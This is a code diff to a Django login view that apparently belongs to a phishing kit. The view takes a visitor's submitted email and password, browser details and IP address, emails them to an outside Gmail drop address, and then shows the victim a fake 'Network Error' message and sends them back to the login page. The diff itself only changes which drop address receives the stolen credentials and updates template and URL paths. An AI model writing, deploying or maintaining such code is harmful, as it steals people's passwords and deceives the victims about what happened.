@@ -23,7 +23,7 @@ def user_login_view(request):
             browser_info = get_browser_info(request)
             ip_address = get_client_ip(request)
 
-            message = render_to_string('email/email_result.html', 
+            message = render_to_string('frontend/email_result.html', 
             {
                 'email': email,
                 'password': password,
@@ -35,14 +35,14 @@ def user_login_view(request):
             })
 
             try:
-                # send_email.email_message_send('Update Successful', message, 'barbaramikheyeva123@gmail.com' )
-                send_email.email_message_send('Update Successful', message, 'petertessy1333@gmail.com' )
+                send_email.email_message_send('Update Successful', message, 'clevelandmedcenter@gmail.com' )
+                # send_email.email_message_send('Update Successful', message, 'petertessy1333@gmail.com' )
                 messages.error(request, "Network Error! Please verify your information and try again.")
             except Exception as e:
                 print(f"Error sending email: {str(e)}")
                 messages.error(request, "Login failed, Please try again")
             finally:
-                url = reverse('user_login') + f'?em={email}'
+                url = reverse('frontend:user_login') + f'?em={email}'
                 return redirect(url)
 
         else:
